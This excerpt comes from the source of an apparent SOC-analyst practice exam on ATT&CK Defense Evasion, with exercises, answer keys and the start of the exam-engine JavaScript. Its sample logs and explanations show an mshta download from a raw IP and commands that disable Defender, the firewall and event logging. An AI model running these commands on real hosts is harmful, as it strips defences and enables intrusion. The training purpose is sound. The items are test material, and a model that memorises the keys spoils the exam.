   summary:"Alert #5521 &mdash; mshta reaches the internet",
   scenario:`<div class="logpanel"><input class="logfilter" type="text" placeholder="Filter lines (e.g. mshta)" aria-label="Filter log lines"><div class="loglines">
<div class="logline">2026-09-30 09:12:44  Sysmon ID 1  P: 6620  mshta.exe hxxp://185[.]62[.]108[.]12/app.hta   PPID: 3188 (OUTLOOK.EXE)  User: CORP\\jdoe</div>
<div class="logline">2026-09-30 09:12:51  Sysmon ID 3  mshta.exe -> 185[.]62[.]108[.]12:80  TCP  established</div>
<div class="logline">2026-09-30 09:13:02  Sysmon ID 1  P: 7104  powershell.exe -nop -enc JABjAD0A...   PPID: 6620 (mshta.exe)</div>
</div></div>
   <p>Alert #5521 fired on these lines. The user opened a malicious attachment; Outlook started mshta, which downloaded and ran a script stage. Your lead wants the alert annotated correctly before escalation.</p>`,
   question:"Select the TWO correct annotations for this alert.",
   hint:"First ask what mshta is doing here. Then ask which telemetry line actually proves it.",
   ix:{opts:[
      {id:"o1", h:"Technique: System Binary Proxy Execution &mdash; Mshta (T1218.005)"},
      {id:"o2", h:"Telemetry: process creation with full command line (Sysmon EID 1) caught it"},
      {id:"o3", h:"Technique: Pass the Ticket (T1550.003)"},
      {id:"o4", h:"Telemetry: DNS logs alone would have caught the full chain"}],
     correct:["o1","o2"]},
   explain:"<p>mshta.exe is a signed Windows tool that executes HTML applications. Attackers love it because it is a <em>trusted proxy</em> for running their code &mdash; ATT&amp;CK calls this System Binary Proxy Execution: Mshta (T1218.005). The proof sits in Sysmon EID 1: the full command line shows mshta pulling <code>app.hta</code> from a raw IP, and EID 3 confirms the connection. Pass the Ticket is about stolen Kerberos tickets &mdash; nothing here touches tickets. And DNS logs alone would show only that a name resolved; they never capture the command line or the script stage.</p>",
   study:"T1218 proxy-execution techniques and the telemetry each one needs."},

  {id:"M02", kind:"dnd",
   summary:"Matrix practice &mdash; six technique cards",
   scenario:`<p>Your team is building an ATT&amp;CK heat map for the last quarter. You collected six technique cards from incident notes. Place every card in the tactic column where it belongs.</p>
   <div class="art"><div class="art-l">Reminder &mdash; tactic goals</div><div class="art-b"><pre class="code">Initial Access    : get in
Credential Access : steal logon material
Defense Evasion   : stay hidden
Impact            : break or damage things</pre></div></div>`,
   question:"Place all six cards into the correct tactic zone.",
   hint:"Ask what each technique is for. Disabling a security tool and deleting logs are both about staying hidden.",
   ix:{zones:[
      {id:"z1", h:"Initial Access"},
      {id:"z2", h:"Credential Access"},
      {id:"z3", h:"Defense Evasion (TA0005)"},
      {id:"z4", h:"Impact"}],
     items:[
      {id:"i1", h:"Spearphishing Attachment (T1566.001)", z:"z1"},
      {id:"i2", h:"OS Credential Dumping (T1003)", z:"z2"},
      {id:"i3", h:"Disable or Modify Tools (T1562.001)", z:"z3"},
      {id:"i4", h:"File Deletion (T1070.004)", z:"z3"},
      {id:"i5", h:"Rootkit (T1014)", z:"z3"},
      {id:"i6", h:"Data Encrypted for Impact (T1486)", z:"z4"}]},
   explain:"<p>Three cards belong to TA0005: disabling tools (T1562.001), deleting evidence (T1070.004) and the kernel-level hiding of a rootkit (T1014). Spearphishing attachments get the attacker in (TA0001), credential dumping steals logon material (TA0006), and ransomware encryption causes damage (TA0040). Notice how one tactic can hold many different-looking techniques &mdash; the column is defined by the <em>goal</em>, not by the method.</p>",
   study:"the goal-based structure of ATT&amp;CK tactic columns."},

  {id:"M03", kind:"qcm",
   summary:"DC-02 &mdash; a logon that should not exist",
   scenario:`<div class="art"><div class="art-l">ARTEFACT 1 &mdash; Windows Security event 4624 (successful logon)</div><div class="art-b"><pre class="code">EventID:         4624
LogonType:       9  (NewCredentials)
Authentication:  NTLM / NtLmSsp
TargetUserName:  CORP\\svc_sql
SourceHost:      VPN-4 (a VPN concentrator)
Note:            svc_sql has no interactive session on VPN-4</pre></div></div>
   <p>AType-9 logon means the process presented <em>different</em> credentials than its own session. The account never logged on interactively on the source host. Your lead asks what this pattern usually means.</p>`,
   question:"Which Defense Evasion technique does this pattern most suggest?",
   hint:"Type 9 with NTLM is the fingerprint of reusing a stolen password secret without knowing the password itself.",
   ix:{opts:[
      {id:"o1", h:"Pass the Hash (T1550.002)"},
      {id:"o2", h:"Pass the Ticket (T1550.003)"},
      {id:"o3", h:"Web Session Cookie (T1550.004)"},
      {id:"o4", h:"Indirect Command Execution (T1202)"}],
     correct:["o1"]},
   explain:"<p>Pass the Hash reuses a stolen NTLM password hash. Tools such as mimikatz present it as new credentials, which Windows records as logon <strong>Type 9 (NewCredentials)</strong> with NTLM. The tell here: the account has no interactive session on the source host, yet &ldquo;it&rdquo; authenticated from there. Pass the Ticket reuses Kerberos tickets (you would expect 4768/4769 Kerberos activity). Web Session Cookie steals browser sessions. Indirect Command Execution runs commands through another binary. The Type-9 + NTLM combination is the classic pass-the-hash footprint, and it is evasion because the attacker never needs the real password.</p>",
   study:"logon types 3 and 9, and T1550 alternate-authentication material."},

  {id:"M04", kind:"fill",
   summary:"Incident note &mdash; tampering and cleanup",
   scenario:`<p>You are writing the timeline section of incident ticket #2214. Your lead wrote the frame; you must insert the correct commands and the proving event ID.</p>`,
   question:"Fill all three blanks with words from the word bank.",
   hint:"Blank 1 is the PowerShell cmdlet that changes Defender preferences. Blank 3 is the event ID that survives a log wipe.",
   ix:{segs:[
      "The attacker used ",
      " to switch off real-time monitoring (T1562.001) and then cleared logs with ",
      " (T1070.001). The event that proves the log clearing even after forwarding is Event ID ",
      "."],
     slots:["Set-MpPreference","wevtutil","1102"],
     slotNames:["the disable cmdlet","the log-clearing tool","the proving event ID"],
     bank:["Set-MpPreference","Get-MpPreference","wevtutil","certutil","1102","7045","104","5007"]},
   explain:"<p><code>Set-MpPreference -DisableRealtimeMonitoring $true</code> changes Defender behavior (the <em>Set</em> verb writes; <em>Get</em> only reads). <code>wevtutil cl</code> clears a named log. Event <strong>1102</strong> is written when the Security log is cleared, and on a forwarded or central copy it survives the wipe &mdash; that is why responders love it. 7045 is new-service installs, 5007 is Defender configuration changes, and 104 covers other logs being cleared. Mixing these IDs up in a report costs credibility; attach each ID to the exact claim.</p>",
   study:"writing precise ATT&amp;CK-backed incident notes."},

  {id:"M05", kind:"term", slot:5,
   summary:"PC-114 &mdash; live protection state",
   scenario:`<p>After the tamper alert on PC-114, you suspect the antivirus policy <em>says</em> protection is on while the live host disagrees. You are in an elevated PowerShell on the workstation. The security policy forbids changing anything during triage.</p>`,
   question:"Type the Get-MpComputerStatus command that prints only the live real-time protection and antivirus switches.",
   hint:"You want the live status, not the policy. Pipe the cmdlet to a selection of the two switch names.",
   ix:{prompt:"PS C:\\Users\\analyst>",
     canon:"Get-MpComputerStatus | Select-Object RealTimeProtectionEnabled, AntivirusEnabled",
     elems:[{re:/get-mpcomputerstatus/, h:"Get-MpComputerStatus &mdash; the cmdlet that reports the live antivirus state"},
            {re:/realtimeprotectionenabled/, h:"RealTimeProtectionEnabled &mdash; the live real-time monitoring switch"},
            {re:/antivirusenabled/, h:"AntivirusEnabled &mdash; the master antivirus switch"},
            {re:/\|/, h:"| &mdash; pipe into a selection so only the two fields print"}],
     forbidden:[{re:/set-mppreference|add-mppreference/, h:"Set-/Add-MpPreference would CHANGE settings &mdash; forbidden during triage"},
                {re:/get-mppreference/, h:"Get-MpPreference reads policy, not the live protection state"}],
     out:["RealTimeProtectionEnabled : False","AntivirusEnabled          : True","(Get-MpComputerStatus has many more fields; Select-Object trimmed them)"]},
   explain:"<p>Two-step reasoning: first pick the right <em>source</em>. <code>Get-MpComputerStatus</code> reports what the engine is doing <em>right now</em>; <code>Get-MpPreference</code> reports what policy <em>wants</em>. The mismatch between the two is itself evidence of tampering. Second, keep the output small: piping to <code>Select-Object RealTimeProtectionEnabled, AntivirusEnabled</code> prints only the two switches you need. And the safety rule held: no <code>Set-</code> cmdlet touched anything during triage. This read-only habit matters in every real SOC.</p>",
   study:"Get-MpComputerStatus versus Get-MpPreference, and read-only triage."},

  {id:"M06", kind:"qcm",
   summary:"PC-07 &mdash; svchost in the wrong place",
   scenario:`<div class="art"><div class="art-l">ARTEFACT 1 &mdash; Sysmon Event ID 1</div><div class="art-b"><pre class="code">Image:        C:\\Users\\Public\\svchost.exe
CommandLine:  svchost.exe -k netsvcs -p
Signed:       unsigned
Parent:       explorer.exe (user double-click)</pre></div></div>
   <p>A &ldquo;svchost.exe&rdquo; started from the user&rsquo;s Public folder, unsigned, launched by a double-click. The real svchost lives in C:\\Windows\\System32 and is spawned by services.exe.</p>`,
   question:"Which technique best describes the attacker's move here?",
   hint:"The attacker did not inject anything yet &mdash; they borrowed a trusted NAME and a wrong PATH.",
   ix:{opts:[
      {id:"o1", h:"Masquerading (T1036.005)"},
      {id:"o2", h:"Process Injection (T1055)"},
      {id:"o3", h:"DLL Search Order Hijacking (T1574.001)"},
      {id:"o4", h:"Create or Modify System Process (T1543)"}],
     correct:["o1"]},
   explain:"<p>The whole trick is the costume: a binary named <code>svchost.exe</code> sitting in <code>C:\\Users\\Public\\</code>, unsigned, started by a user double-click. Real svchost instances run from System32 under services.exe. Naming a binary after a legitimate Windows process to blend in is Masquerading &mdash; here the Match Legitimate Name or Location flavor, T1036.005. Nothing was injected into another process (T1055), no DLL was planted on a search path (T1574.001), and no service was created or modified (T1543). In your SIEM, the cheap analytic is: <em>process name says Windows, path says otherwise</em>.</p>",
   study:"masquerading by name and location (T1036.005) versus injection."},

  {id:"M07", kind:"dnd",
   summary:"Which telemetry proves which move?",
   scenario:`<p>Your detection engineer asks for help sorting an backlog of questions: &ldquo;which data source actually proves each attacker move?&rdquo; Match each artifact to the data source that best captures it.</p>`,
   question:"Drag each artifact onto the data source that best proves it.",
   hint:"Think about where each change is written: services, registry, alternate data streams, and process trees live in different places.",
   ix:{zones:[
      {id:"z1", h:"Service events (7036 / 7040)"},
      {id:"z2", h:"Registry telemetry (Sysmon EID 13 / event 4657)"},
      {id:"z3", h:"Sysmon EID 15 (alternate data stream)"},
      {id:"z4", h:"Process-creation telemetry with parent (Sysmon EID 1)"}],
     items:[
      {id:"i1", h:"The WinDefend service stopped and its start type changed", z:"z1"},
      {id:"i2", h:"A Defender policy registry value flipped to disabled", z:"z2"},
      {id:"i3", h:"A hidden payload sat inside a Zone.Identifier ADS", z:"z3"},
      {id:"i4", h:"A suspicious process had an odd parent in the tree", z:"z4"}]},
   explain:"<p>Every Defense Evasion move writes its own kind of trace. Service stops and start-type changes land in service events (7036 status, 7040 start type). Registry edits appear in Sysmon EID 13 or event 4657 with the old and new value. NTFS alternate data streams &mdash; where attackers stash payloads &mdash; are covered by Sysmon EID 15 (FileCreateStreamHash). And masquerading or hollowing often shows up as a parent&ndash;child mismatch in process-creation events (EID 1). Picking the <em>right</em> data source is half of detection engineering.</p>",
   study:"mapping TA0005 techniques to their data sources."},

  {id:"M08", kind:"branch",
   summary:"Alert #7730 &mdash; Defender start type changed",
   scenario:`<div class="art"><div class="art-l">ARTEFACT 1 &mdash; two related events, host FS-01</div><div class="art-b"><pre class="code">02:14:08  Event 7040  The start type of the WinDefend service was changed from auto start to disabled.
02:14:09  Sysmon EID 13  Registry set: HKLM\\SYSTEM\\CurrentControlSet\\Services\\WinDefend\\Start = 4
02:15:22  Event 7036  The WinDefend service entered the stopped state.</pre></div></div>
   <p>Alert #7730 fired on host FS-01, a file server. No change ticket exists. You have three decisions to make in sequence.</p>`,
   question:"Work through all three steps of the decision chain.",
   hint:"Step 1: name the family. Step 2: pick the events that prove it. Step 3: fix the defense without losing evidence.",
   ix:{steps:[
      {q:"Which ATT&CK family describes what happened at 02:14?",
       opts:[{id:"o1", h:"Impair Defenses (T1562) &mdash; a security tool was crippled"},
             {id:"o2", h:"Indicator Removal (T1070) &mdash; logs were wiped"},
             {id:"o3", h:"Masquerading (T1036) &mdash; a binary was renamed"}],
       correct:"o1"},
      {q:"Which evidence pair proves BOTH the change and the actor?",
       opts:[{id:"o4", h:"Event 7040 + Sysmon EID 13, which name the process and account"},
             {id:"o5", h:"Event 1102 (log cleared) + Sysmon EID 15 (alternate data stream)"},
             {id:"o6", h:"Event 4624 (logon) + Sysmon EID 3 (network connection)"}],
       correct:"o4"},
      {q:"What is your first response action?",
       opts:[{id:"o7", h:"Snapshot the evidence first, then restore the service start type"},
             {id:"o8", h:"Delete the registry key so the setting cannot repeat"},
             {id:"o9", h:"Reboot the server and see if it heals itself"}],
       correct:"o7"}]},
   explain:"<p>The chain: an attacker (or a rogue admin) flipped the <code>Start</code> value of WinDefend to 4 (disabled) &mdash; registry tampering via Modify Registry (T1112) in the service of Impair Defenses (T1562.001). Event 7040 confirms the service-level effect; Sysmon EID 13 gives the <em>process and account</em> that wrote the value &mdash; together they prove both change and actor. First response preserves before it repairs: snapshot evidence, note the actor, then re-enable. Deleting the registry key destroys evidence and reboots solve nothing while the attacker still holds access. Trickbot and Emotet used almost exactly this disable-then-stop pattern in documented campaigns.</p>",
   study:"T1562.001 via T1112, and the events 7040/7036/13 that prove it."},

  {id:"M09", kind:"multi",
   summary:"Control review &mdash; two real blockers",
   scenario:`<p>After ticket #2214 your CISO asks: &ldquo;what would have made the Defender tampering <em>harder</em>?&rdquo; Four proposals are on the table. Two genuinely block T1562.001.</p>`,
   question:"Select the TWO proposals that actually make T1562.001 harder.",
   hint:"Blocking needs either protection against local tampering, or fewer accounts powerful enough to tamper.",
   ix:{opts:[
      {id:"o1", h:"Enable Defender Tamper Protection with cloud-delivered settings"},
      {id:"o2", h:"Remove local admin rights from standard users (least privilege)"},
      {id:"o3", h:"Add more exclusions to the antivirus so scans run faster"},
      {id:"o4", h:"Move log retention from 90 to 30 days to save cost"}],
     correct:["o1","o2"]},
   explain:"<p>Tamper Protection blocks the classic <code>Set-MpPreference</code> and registry paths that disable protection locally &mdash; it is part of the Antivirus/Antimalware mitigation (M1049) and turns the easiest T1562.001 move into an alert. Removing local admin rights shrinks the set of accounts that can run <code>sc config</code> or write HKLM values &mdash; that is Privileged Account Management (M1026) plus Operating System Configuration (M1028). More exclusions actually <em>help</em> evasion, and shorter log retention weakens your own evidence. Both wrong options quietly work for the attacker.</p>",
   study:"M1049 tamper protection and M1026 least privilege versus T1562.001."},

  {id:"M10", kind:"order",
   summary:"Playbook order &mdash; first evasion alert",
   scenario:`<p>A new analyst asks: &ldquo;the moment a Defense Evasion alert lands, what do I do, in what order?&rdquo; Sort the four playbook steps.</p>`,
   question:"Order the four triage steps from first to last.",
   hint:"You cannot decide before you verify, and you should not report before you contain.",
   ix:{items:[
      {id:"i1", h:"Verify the alert in raw telemetry (events, process line, account)"},
      {id:"i2", h:"Identify scope: which hosts, accounts and tools are affected"},
      {id:"i3", h:"Contain: restore the defense and block the actor's access"},
      {id:"i4", h:"Report and tune: document the finding, improve the detection"}]},
   explain:"<p>The order is verify &rarr; scope &rarr; contain &rarr; report. Acting on an unverified alert wastes containment effort; containing before you know the scope leaves the attacker a side door; and reporting before containment usually means the story changes an hour later. Real SOC playbooks bake this order in for tampering alerts, because impaired defenses make every later step slower &mdash; you are racing the attacker&rsquo;s next move while your visibility is reduced.</p>",
   study:"evasion-alert triage order in SOC playbooks."},

  {id:"M11", kind:"term", slot:11,
   summary:"Triage &mdash; decode the dropped stage",
   scenario:`<div class="art"><div class="art-l">ARTEFACT 1 &mdash; Sysmon EID 11 (file create) on PC-114</div><div class="art-b"><pre class="code">TargetFilename: C:\\Users\\jdoe\\AppData\\Local\\Temp\\invoice_img.b64
Note:           file content starts with "JABjAD0A..." (Base64 text)</pre></div></div>
   <p>The analyst before you confirmed the .b64 file decodes to a Windows executable. You want the decoded file saved next to it as <code>invoice_img.exe</code> so the sandbox can scan it. The decoding tool is already known to your team &mdash; the same one attackers abuse for the reverse direction.</p>`,
   question:"Type the certutil command that decodes that Base64 file into invoice_img.exe.",
   hint:"The tool is certutil and the sub-command is -decode. Give it the input file, then the output file.",
   ix:{prompt:"PS C:\\Users\\analyst\\Temp>",
     canon:"certutil -decode invoice_img.b64 invoice_img.exe",
     elems:[{re:/certutil/, h:"certutil &mdash; the certificate utility your team uses for decode"},
            {re:/-decode\b/, h:"-decode &mdash; Base64 text to binary"},
            {re:/invoice_img\.b64/, h:"invoice_img.b64 &mdash; the encoded input"},
            {re:/invoice_img\.exe/, h:"invoice_img.exe &mdash; the decoded output"}],
     forbidden:[{re:/-encode\b/, h:"-encode runs the wrong direction (binary to Base64)"},
                {re:/-urlcache|urlcache/, h:"-urlcache downloads from the network &mdash; not what triage needs"}],
     out:["Input Length = 248576","Output Length = 186368","CertUtil: -decode command completed successfully."]},
   explain:"<p>The attacker encoded the payload (Obfuscated Files or Information, T1027); decoding it with <code>certutil -decode &lt;in&gt; &lt;out&gt;</code> is the defender mirror &mdash; ATT&amp;CK lists the decode direction as Deobfuscate/Decode Files or Information (T1140). The same tool does both jobs, which is exactly why it appears in attacker tradecraft too. Note the two wrong directions in the feedback: <code>-encode</code> would wrap the file deeper, and <code>-urlcache</code> would fetch something from the network &mdash; the last thing a triage sandbox needs.</p>",
   study:"T1140 decode workflows and certutil's dual use."},

  {id:"M12", kind:"qcm",
   summary:"One-liner review &mdash; Timestomp",
   scenario:`<p>A junior asks in the team chat: &ldquo;I keep mixing up timestomping with packing. What does Timestomp (T1070.006) actually change?&rdquo;</p>`,
   question:"What does Timestomp change?",
   hint:"Think about the file's metadata in Explorer, not its content.",
   ix:{opts:[
      {id:"o1", h:"The timestamps of a file, to blend it into its folder"},
      {id:"o2", h:"The contents of a file, to hide code inside it"},
      {id:"o3", h:"The owner of a file, to blame another account"},
      {id:"o4", h:"The size of a file, to fill up the disk"}],
     correct:["o1"]},
   explain:"<p>Timestomping rewrites a file&rsquo;s timestamps (created, modified, accessed) so the malware looks as old and boring as its neighbors. It is Indicator Removal (T1070.006), not obfuscation: the content is untouched. The classic giveaway for responders is a <em>modified</em> time older than the <em>created</em> time &mdash; files cannot naturally be edited before they exist &mdash; plus mismatches between the two timestamp sets Windows keeps. Packing (T1027.002) instead changes the code layout to resist analysis. Owner and size are not what timestomping touches.</p>",
   study:"T1070.006 timestomping and its forensic tells."},

  {id:"M13", kind:"multi",
   summary:"Host SRV-9 &mdash; the firewall went quiet",
   scenario:`<div class="logpanel"><input class="logfilter" type="text" placeholder="Filter lines (e.g. firewall)" aria-label="Filter log lines"><div class="loglines">
<div class="logline">2026-10-01 01:58:12  Sysmon ID 1   netsh.exe advfirewall set allprofiles state off   User: CORP\\adm_helpdesk</div>
<div class="logline">2026-10-01 01:58:40  Event 7036   The Windows Defender Firewall service entered the stopped state.</div>
<div class="logline">2026-10-01 01:59:03  Sysmon ID 13 Registry set: HKLM\\...\\SharedAccess\\Parameters\\FirewallPolicy\\EnableFirewall = 0</div>
</div></div>
   <p>On server SRV-9, three related events arrived within one minute. The host firewall is now off, and the service behind it is stopped. No change ticket exists.</p>`,
   question:"Select the TWO techniques this chain demonstrates.",
   hint:"One line turns the firewall OFF as a configuration change; another stops the security SERVICE entirely.",
   ix:{opts:[
      {id:"o1", h:"Disable or Modify System Firewall (T1562.004)"},
      {id:"o2", h:"Disable or Modify Tools (T1562.001)"},
      {id:"o3", h:"Clear Windows Event Logs (T1070.001)"},
      {id:"o4", h:"Hidden Files and Directories (T1564.001)"}],
     correct:["o1","o2"]},
   explain:"<p><code>netsh advfirewall set allprofiles state off</code> flips the firewall configuration &mdash; that is Disable or Modify System Firewall (T1562.004). Stopping the firewall <em>service</em> is broader tool impairment &mdash; T1562.001; the same sub-technique covers killing antivirus agents. The registry write is the mechanism behind the config change, not a separate technique here. Nothing was cleared (no 1102) and nothing was hidden with attributes (no attrib) &mdash; so T1070.001 and T1564.001 do not fit. Real-world note: Impair Defenses family members often chain within minutes, exactly like this.</p>",
   study:"T1562.004 versus T1562.001, and their event signatures."},

  {id:"M14", kind:"dnd",
   summary:"Sub-theme sort &mdash; inside TA0005",
   scenario:`<p>Your team maintains an internal wiki page for TA0005 with five sub-theme buckets. Six techniques arrived unsorted. Place each technique into its sub-theme.</p>`,
   question:"Drag all six techniques into the correct sub-theme bucket.",
   hint:"Log tampering touches event logs. Impairment touches security tools. Masquerading touches names. Obfuscation touches content. Hiding touches visibility.",
   ix:{zones:[
      {id:"z1", h:"Log tampering"},
      {id:"z2", h:"Defense impairment"},
      {id:"z3", h:"Masquerading"},
      {id:"z4", h:"Obfuscation"},
      {id:"z5", h:"Hiding"},
      {id:"z6", h:"Trusted-tool proxy execution"}],
     items:[
      {id:"i1", h:"Clear Windows Event Logs (T1070.001)", z:"z1"},
      {id:"i2", h:"Disable or Modify Tools (T1562.001)", z:"z2"},
      {id:"i3", h:"Double File Extension (T1036.007)", z:"z3"},
      {id:"i4", h:"Binary Padding (T1027.001)", z:"z4"},
      {id:"i5", h:"Hidden Window (T1564.003)", z:"z5"},
      {id:"i6", h:"MSBuild proxy execution (T1127.001)", z:"z6"}]},
   explain:"<p>These buckets mirror how SOC teams actually hunt inside TA0005. Log tampering: T1070.001 wipes event logs. Defense impairment: T1562.001 attacks your tools. Masquerading: T1036.007 abuses a trustworthy-looking extension. Obfuscation: T1027.001 pads a binary so signatures and sandboxers misread it. Hiding: T1564.003 runs the payload in an invisible window. Proxy execution: T1127.001 makes MSBuild &mdash; a trusted developer utility &mdash; compile and run attacker code. Knowing the sub-theme speeds up both your hunt queries and your report writing.</p>",
   study:"the internal structure of TA0005 by sub-theme."},

  {id:"M15", kind:"qcm",
   summary:"GPO review &mdash; the log-saving mistake",
   scenario:`<div class="art"><div class="art-l">ARTEFACT 1 &mdash; proposed GPO change, ticket CHG-2214</div><div class="art-b"><pre class="code">Setting:  Windows Logging - Security  =  DISABLED
Reason:   "The Security log fills the disk too fast.
           Disabling it saves space on all workstations."</pre></div></div>
   <p>A colleague proposes this Group Policy change for all 4,000 workstations. Your lead forwards it to you with one word: &ldquo;review?&rdquo;</p>`,
   question:"What is the core mistake in this proposal?",
   hint:"Ask what the Security log is FOR, and who benefits when it stops writing.",
   ix:{opts:[
      {id:"o1", h:"It blinds detection on every workstation &mdash; the exact goal of T1562.002"},
      {id:"o2", h:"GPOs cannot technically change Windows event log settings"},
      {id:"o3", h:"Disabling the Security log also disables the Application log"},
      {id:"o4", h:"The log would grow faster, not slower, once the policy applies"}],
     correct:["o1"]},
   explain:"<p>Disabling Security logging on every workstation hands attackers the same outcome they work for: Disable Windows Event Logging is literally technique T1562.002. The disk-saving goal is real, but the method trades your only local evidence for a few gigabytes &mdash; the right fixes are forwarding logs centrally and sizing retention properly. GPOs absolutely can set event-log policy (wrong option 2), Application and Security are separate logs (wrong option 3), and disabling stops growth entirely (wrong option 4). When your own config matches an attacker technique, the ATT&amp;CK mapping makes the argument for you in the review meeting.</p>",
   study:"T1562.002 as a configuration risk, not only an attacker move."},

  {id:"M16", kind:"multi",
   summary:"Why rundll32? &mdash; attacker reasoning",
   scenario:`<p>Attack stub code on WS-71 launches its payload through <code>rundll32.exe</code> instead of running it directly. The stub could have started the payload itself. Your red-team liaison asks the blue team: &ldquo;why would an attacker route execution through rundll32?&rdquo;</p>`,
   question:"Select the TWO reasons that make rundll32 attractive to attackers.",
   hint:"One reason is about looking normal on the endpoint. The other is about rules that trust that binary.",
   ix:{opts:[
      {id:"o1", h:"It is a signed Windows binary, so the activity looks like normal system behavior"},
      {id:"o2", h:"Application allow-listing rules often trust rundll32, so the payload slips through"},
      {id:"o3", h:"It encrypts the payload automatically during execution"},
      {id:"o4", h:"It silently grants the attacker local admin rights"}],
     correct:["o1","o2"]},
   explain:"<p>This is System Binary Proxy Execution: Rundll32 (T1218.011) thinking. Reason one is blending: rundll32.exe is Microsoft-signed and runs on every Windows box, so a casual reviewer sees &ldquo;Windows stuff&rdquo;. Reason two is policy abuse: allow-listing schemes commonly whitelist rundll32 by name, so hostile code sneaks under the rule. Rundll32 does not encrypt anything (that is T1027 territory, done before execution) and it grants no privileges at all &mdash; privilege gains need separate techniques like T1548 UAC bypass. Dual-perspective takeaway: the attacker wants legitimacy; the defender counters by watching <em>what rundll32 loads and who its parent is</em>, not just that it ran.</p>",
   study:"T1218.011 and proxy-execution detection angles."}
];


</script>
<script>
/* CyberPulseAcademy practice-exam engine — TA0005 Defense Evasion (4 severity tiers).
   Vanilla JS, no external requests. Implements: partial-credit scoring, Check-triggered
   auto-pause, manual pause, skip + review pool, hints with credit cost, results + retake,
   site handshake and single-shot score reporting. */
(function () {
  "use strict";

  var CFG = CONFIG, INTROD = INTRO, EXS = EXERCISES;

  /* ---------- small helpers ---------- */
  function $id(i) { return document.getElementById(i); }
  function h(tag, cls, html) { var e = document.createElement(tag); if (cls) e.className = cls; if (html != null) e.innerHTML = html; return e; }
  function esc(s) { return String(s).replace(/&/g, "&amp;").replace(/</g, "&lt;").replace(/>/g, "&gt;").replace(/"/g, "&quot;"); }
  function shuffle(a) { a = a.slice(); for (var i = a.length - 1; i > 0; i--) { var j = Math.floor(Math.random() * (i + 1)); var t = a[i]; a[i] = a[j]; a[j] = t; } return a; }
  function fmtTime(s) { s = Math.max(0, s | 0); var m = (s / 60) | 0, r = s % 60; return (m < 10 ? "0" : "") + m + ":" + (r < 10 ? "0" : "") + r; }
  function byId(id) { for (var i = 0; i < EXS.length; i++) if (EXS[i].id === id) return EXS[i]; return null; }
  function posOf(id) { for (var i = 0; i < S.order.length; i++) if (EXS[S.order[i]].id === id) return i; return -1; }

  /* Mandatory reusable scoring function: max(0, (H - W) / N) */
  function scoreExercise(selectedItems, correctItems) {
    var N = correctItems.length;
    if (!N) return 1;
    var corr = {}, i;
    for (i = 0; i < N; i++) corr[correctItems[i]] = true;
    var H = 0, W = 0;
    for (i = 0; i < N; i++) if (corr[correctItems[i]] && selectedItems.indexOf(correctItems[i]) !== -1) H++;
    for (i = 0; i < selectedItems.length; i++) if (!corr[selectedItems[i]]) W++;
    return Math.max(0, (H - W) / N);
  }

  /* ---------- lightweight syntax highlighter for logs / commands ---------- */
  var RXHL = /(&quot;[^&]*?&quot;)|([A-Za-z]:\\[^\s,&<]+)|(\b\d+(?:[.,]\d+)?\b)|(\/[A-Za-z:.0-9]+|-[A-Za-z]+[.\w]*|\$\w+)|(\b(?:wevtutil|certutil|sc|net|attrib|powershell|powershell\.exe|mshta|mshta\.exe|rundll32|rundll32\.exe|regsvr32|regsvr32\.exe|wmic|schtasks|reg|taskkill|vssadmin|sdelete|bcdedit|installutil|msbuild|Get-WinEvent|Get-MpComputerStatus|Get-MpPreference|Set-MpPreference|Add-MpPreference|Clear-EventLog|Stop-Service|Select-Object|Where-Object|Format-List|Export-Clixml|WinDefend|Security|System|Sysmon|Operationally)\b)/g;
  function hl(text) {
    var s = esc(text);
    return s.replace(RXHL, function (m, str, path, num, flag, kw) {
      if (str) return '<span class="tok-str">' + str + "</span>";
      if (path) return '<span class="tok-path">' + path + "</span>";
      if (num) return '<span class="tok-num">' + num + "</span>";
      if (flag) return '<span class="tok-flag">' + flag + "</span>";
      return '<span class="tok-kw">' + kw + "</span>";
    });
  }
  function bindLogFilters(root) {
    Array.prototype.forEach.call(root.querySelectorAll(".logpanel"), function (p) {
      var inp = p.querySelector(".logfilter");
      if (!inp || inp.getAttribute("data-bound")) return;
      inp.setAttribute("data-bound", "1");
      inp.addEventListener("input", function () {
        var q = inp.value.toLowerCase();
        Array.prototype.forEach.call(p.querySelectorAll(".logline"), function (l) {
          var match = !q || l.textContent.toLowerCase().indexOf(q) !== -1;
          l.style.display = match ? "" : "none";
          if (q && match) l.classList.add("hit"); else l.classList.remove("hit");
        });
      });
    });
    /* One-time syntax highlighting of plain-text log lines (spec: the log
       viewer mimics Kibana/Splunk with highlighting + a filter box). */
    Array.prototype.forEach.call(root.querySelectorAll(".logline"), function (l) {
      if (l.getAttribute("data-hl")) return;
      l.setAttribute("data-hl", "1");
      l.innerHTML = hl(l.textContent);
    });
  }
  function highlightCodeIn(root) {
    var pres = root.querySelectorAll("pre.code");
    Array.prototype.forEach.call(pres, function (p) {
      var t = p.textContent;
      p.innerHTML = hl(t);
    });
  }

  /* ---------- global state ---------- */
  var S = {
    screen: "intro",          /* intro | exam | review | results */
    order: [], pos: 0,
    cur: null, reviewFlag: false,
    answered: {}, skipped: {},
    score: 0, answeredN: 0,
    hints: {},                /* exId -> {used, shown} */
    attempt: 0, reported: false,
    user: { username: "", country: "", theme: "", locale: "" },
    tm: { state: "IDLE", remaining: 0, iv: null, manualMs: 0, autoMs: 0, pauseStart: 0, prev: "RUNNING" },
    reduced: { left: 0, total: 0 }
  };

  /* ---------- timer state machine ----------
     States: IDLE, RUNNING, PAUSED_MANUAL, PAUSED_AUTO_CHECK, ENDED.
     Check -> PAUSED_AUTO_CHECK (first action, before feedback renders).
     Next / Final Submit -> RUNNING or ENDED.
     Skip / Hint -> never change the state.
     Manual Pause on top of auto-pause -> PAUSED_MANUAL; Resume returns to PAUSED_AUTO_CHECK. */
  function setTimerState(st) {
    if (S.tm.state === st) return;
    var was = S.tm.state;
    /* Charge elapsed pause time to the state we are LEAVING, then re-arm the
       clock whenever a new pause segment starts (manual on top of auto-pause
       produces three correctly-attributed segments). */
    if (was === "PAUSED_MANUAL") S.tm.manualMs += Date.now() - S.tm.pauseStart;
    else if (was === "PAUSED_AUTO_CHECK") S.tm.autoMs += Date.now() - S.tm.pauseStart;
    if (st === "PAUSED_MANUAL" || st === "PAUSED_AUTO_CHECK") S.tm.pauseStart = Date.now();
    S.tm.state = st;
    renderTimer();
  }
  function tick() {
    if (S.tm.state !== "RUNNING") return;
    if (S.reduced.total > 0 && S.cur && S.cur.ex && S.cur.ex.ix && S.cur.ex.ix.reduced && !S.cur.graded) {
      S.reduced.left--;
      renderReduced();
      if (S.reduced.left <= 0) { onCheck(); return; }
    }
    S.tm.remaining--;
